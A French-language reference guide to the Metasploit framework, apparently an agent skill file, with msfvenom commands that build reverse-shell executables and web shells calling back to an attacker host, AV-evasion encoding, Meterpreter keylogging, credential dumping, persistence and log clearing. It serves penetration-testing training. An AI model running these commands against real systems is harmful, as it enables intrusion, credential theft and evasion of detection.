---
name: metasploit
description: Guide complet du framework Metasploit — msfconsole, modules, exploits, payloads, Meterpreter, msfvenom, post-exploitation, et bonnes pratiques.
---

# Metasploit Framework — Guide Complet

## Présentation

Metasploit est un framework open-source de test d'intrusion développé par Rapid7.
Il fournit une plateforme pour développer, tester et exécuter du code d'exploit.

**Langage** : Principalement Ruby (modules en Ruby, certains en Python/C)
**Licence** : BSD
**Port par défaut** : 3790

---

## Installation

### Kali Linux (pré-installé)
```bash
sudo apt update && sudo apt install metasploit-framework
```

### Ubuntu / Debian
```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod +x msfinstall
sudo ./msfinstall
```

### Initialisation de la base PostgreSQL
```bash
sudo service postgresql start
sudo msfdb init
```

---

## Composants principaux

| Composant | Description |
|-----------|-------------|
| **msfconsole** | Interface en ligne de commande principale |
| **Exploits** | Code exploitant une vulnérabilité spécifique |
| **Payloads** | Code exécuté sur la cible après exploitation |
| **Auxiliary** | Scan, fingerprinting, fuzzing, DoS |
| **Post** | Modules post-exploitation (élévation, pivot, etc.) |
| **Encoders** | Encodage des payloads pour contourner la détection |
| **NOPs** | Générateurs de NOP sled |
| **msfvenom** | Générateur de payloads standalone |

---

## Commandes essentielles msfconsole

### Navigation et recherche
```bash
msfconsole                # Lancer Metasploit
help                      # Aide intégrée
search <terme>            # Rechercher un module
search type:exploit name:smb   # Recherche par type et nom
search cve:2017-0144      # Recherche par CVE (EternalBlue)
use <chemin/module>       # Sélectionner un module
back                      # Revenir en arrière
info                      # Informations sur le module courant
```

### Gestion des sessions
```bash
sessions -l               # Lister les sessions actives
sessions -i <id>          # Interagir avec une session
sessions -k <id>          # Terminer une session
sessions -u <id>          # Upgrader vers Meterpreter
background / bg           # Mettre la session en arrière-plan
```

### Workspaces (projets)
```bash
workspace                 # Lister les espaces de travail
workspace -a <nom>        # Créer un espace
workspace -d <nom>        # Supprimer un espace
workspace <nom>           # Changer d'espace
```

### Configuration de module
```bash
show options              # Afficher les options du module
show payloads             # Afficher les payloads disponibles
show targets              # Afficher les cibles supportées
set RHOSTS <IP>           # Définir l'IP cible
set RHOST <IP>            # Cible unique
set RPORT <port>          # Port cible
set LHOST <IP>            # IP locale (attaquant)
set LPORT <port>          # Port local
set PAYLOAD <chemin>      # Sélectionner le payload
unset <option>            # Effacer une option
setg <option> <valeur>    # Variable globale
```

### Exécution
```bash
check                     # Vérifier si la cible est vulnérable (sans exploiter)
exploit / run             # Lancer l'exploit
exploit -j                # Lancer en arrière-plan (job)
exploit -z                # Lancer sans interagir avec la session
reload                    # Recharger le module
```

---

## Types de payloads

### Classification
| Type | Description |
|------|-------------|
| **inline / single** | Payload unique, une seule étape |
| **stager** | Petit payload qui télécharge le payload principal |
| **staged** | Payload principal téléchargé par le stager |

### Types de connexion
| Type | Description |
|------|-------------|
| **bind shell** | La cible écoute, l'attaquant se connecte |
| **reverse shell** | L'attaquant écoute, la cible se connecte (contourne firewall) |
| **Meterpreter** | Payload avancé en mémoire uniquement |

### Convention de nommage
```
<OS>/<arch>/<type>/<connexion>
ex: windows/x64/meterpreter/reverse_tcp
ex: linux/x86/shell_reverse_tcp
```

---

## msfvenom — Générateur de payloads

### Syntaxe de base
```bash
msfvenom -p <payload> LHOST=<IP> LPORT=<port> -f <format> -o <fichier>
```

### Exemples courants
```bash
# Reverse shell Windows (exe)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe

# Reverse shell Linux (elf)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell.elf

# Reverse shell Python
msfvenom -p python/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw

# PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.php

# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f asp -o shell.asp

# WAR (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f war -o shell.war

# Encodage (contournement AV basique)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o shell.exe

# Lister les encodeurs
msfvenom -l encoders

# Lister les payloads
msfvenom -l payloads

# Lister les formats de sortie
msfvenom -l formats
```

---

## Meterpreter — Payload avancé

### Avantages
- Réside uniquement en mémoire RAM (pas sur le disque)
- Communication chiffrée (TLS)
- Extensible via des extensions (kiwi, incognito, etc.)
- Multi-plateforme (Windows, Linux, macOS, Android)

### Commandes Meterpreter essentielles
```bash
# Informations système
sysinfo                   # Infos système
getuid                    # Identité actuelle
getprivs                  # Privilèges
ps                        # Processus en cours
getpid                    # PID du processus courant

# Fichiers
ls / cat / cd / pwd       # Navigation fichier
download <fichier>        # Télécharger depuis la cible
upload <local> <distant>  # Uploader vers la cible
edit <fichier>            # Éditer un fichier

# Réseau
ipconfig / ifconfig       # Configuration réseau
route                     # Table de routage
portfwd add -l <LPORT> -p <RPORT> -r <cible>  # Redirection de port

# Capture
screenshot                # Capture d'écran
webcam_list               # Lister les webcams
webcam_snap               # Photo webcam
keyboard_send <texte>     # Envoyer des frappes
keyscan_start / keyscan_dump / keyscan_stop  # Keylogger

# Élévation / Credentials
getsystem                 # Tentative d'élévation SYSTEM (Windows)
hashdump                  # Vider les hashs SAM (Windows)
load kiwi                 # Charger Mimikatz (Windows)
creds_all                 # Extraire les credentials

# Persistence
run persistence -A -i 10 -p 4444 -r <LHOST>   # Persistance Windows
run persistence -X -i 5 -p 4444 -r <LHOST>     # Démarrage automatique

# Réseau / Pivoting
run autoroute -s <réseau>  # Ajouter une route vers un réseau
run post/multi/manage/autoroute   # Ajout automatique

# Shell
shell                     # Lancer un shell système
execute -f cmd.exe -c     # Exécuter une commande
```

---

## Workflow typique de pentest

### 1. Reconnaissance
```bash
db_nmap -sV -sC -O <cible>     # Scan Nmap intégré
use auxiliary/scanner/portscan/tcp
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/http/dir_scanner
```

### 2. Identification des vulnérabilités
```bash
search type:exploit <service>
use <exploit>
show options
set RHOSTS <IP>
check              # Vérifier sans exploiter
```

### 3. Exploitation
```bash
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <mon_IP>
exploit
```

### 4. Post-exploitation
```bash
getsystem
hashdump
load kiwi → creds_all
search type:post
```

### 5. Pivoting (mouvement latéral)
```bash
# Ajouter une route vers le réseau interne
route add <réseau> <masque> <session_id>
# Scanner le réseau interne
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
```

### 6. Persistance et cleanup
```bash
run persistence
clearev                  # Effacer les logs (Windows)
```

---

## Resource Scripts (automatisation)

```bash
# Créer un script de ressources depuis une session
makerc /chemin/script.rc

# Exécuter un script
resource /chemin/script.rc

# Exemple de script .rc
# use exploit/windows/smb/ms17_010_eternalblue
# set RHOSTS 192.168.1.10
# set PAYLOAD windows/x64/meterpreter/reverse_tcp
# set LHOST 10.0.0.5
# exploit -j
```

---

## Modules d'exploit notables

| Module | Cible |
|--------|-------|
| `exploit/windows/smb/ms17_010_eternalblue` | Windows SMBv1 (WannaCry) |
| `exploit/windows/smb/ms08_067_netapi` | Windows XP/2003 SMB |
| `exploit/multi/http/apache_struts2_rest_xstream` | Apache Struts2 |
| `exploit/multi/http/tomcat_mgr_upload` | Tomcat Manager |
| `exploit/unix/ftp/vsftpd_234_backdoor` | vsFTPd backdoor |
| `exploit/multi/handler` | Écouteur multi-payload |

---

## Dépannage

| Problème | Solution |
|----------|---------|
| Erreur base de données | `sudo msfdb init` puis `sudo msfdb start` |
| Modules non trouvés | `msfupdate` |
| Erreur Ruby gems | `gem update --system` |
| Performance lente | `sessions -K` pour tuer toutes les sessions |
| Payload ne connecte pas | Vérifier LHOST, LPORT, pare-feu cible |
| Bind shell bloqué | Utiliser un reverse shell à la place |

---

## Sécurité et éthique

1. **Toujours** obtenir une autorisation écrite avant tout test
2. **Jamais** utiliser sur des systèmes sans permission explicite
3. **Utiliser** un environnement de lab isolé pour l'entraînement
4. **Documenter** toutes les activités
5. L'utilisation non autorisée est **illégale** et **contraire à l'éthique**

### Labs d'entraînement
- **Metasploitable 2/3** — VM volontairement vulnérables
- **HackTheBox** — Plateforme de challenges
- **TryHackMe** — Parcours d'apprentissage guidés
- **VulnHub** — VMs vulnérables téléchargeables
- **OWASP WebGoat** — Application web vulnérable

---

## Aide-mémoire rapide

```bash
msfconsole                              # Lancer
search <terme>                          # Chercher
use <module>                            # Sélectionner
show options                            # Options
set RHOSTS <IP>; set PAYLOAD <...>      # Configurer
exploit                                 # Lancer
sessions -i <id>                        # Interagir
bg                                      # Arrière-plan
```

```bash
# Payload rapide
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell.exe
```
